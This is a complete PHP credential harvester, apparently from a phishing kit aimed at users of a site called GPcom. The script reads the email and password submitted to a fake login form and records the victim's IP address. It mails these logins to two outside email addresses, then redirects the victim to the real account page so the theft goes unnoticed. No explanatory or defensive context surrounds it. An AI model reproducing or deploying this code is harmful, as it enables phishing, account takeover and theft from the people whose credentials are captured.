<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "GPcom Email             : ".$_POST['nice']."\n";
$message .= "Password              : ".$_POST['pass']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "wunchunx@aol.com, tvancx@yandex.com";
$subject = " GPcom  LOGINS | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://gpcom.com/my-account/");
?>